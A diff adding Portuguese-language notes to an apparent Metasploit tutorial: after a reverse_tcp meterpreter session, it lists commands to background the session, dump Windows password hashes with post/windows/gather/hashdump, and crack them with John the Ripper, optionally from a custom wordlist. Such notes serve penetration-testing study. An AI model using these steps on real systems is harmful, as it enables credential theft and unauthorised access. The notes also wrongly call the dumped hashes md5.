@@ -123,5 +123,31 @@ set payload windows/meterpreter/reverse_tcp
 
 setar as informações de LHOST e LPORT conforme configurado no payload.
 
+--------------
+Com o acesso copleto ao meterpreter, temos todo o poder, mas sempre é aconselhavel a nao modificar e nem excluir ou criara nada na vitima.
+
+Podemos capturar o hash md5 de senhas dos usuarios da mquina e quebrar com o jtr (john the ripper)
+
+colocar a sessão em background:
+background
+
+Usar o POST exploit post/windows/gather/hashdump
+use post/windows/gather/hashdump
+
+Setar a sessao que colocamos em background:
+set sessions 1
+
+Fazer a captura:
+run
+
+Usar o modo AUXILIAR auxiliary/analyzer/jtr_crack_fast para quebrar a senha
+auxiliary/analyzer/jtr_crack_fast
+
+Fazer a quebra de senha:
+run
+
+###Caso prefira usar WORDLIST, setar a opção CUSTOM_WORDLIST antes de iniciar a quebra
+set CUSTOM_WORDLIST /root/wordlist.txt
+
 
 
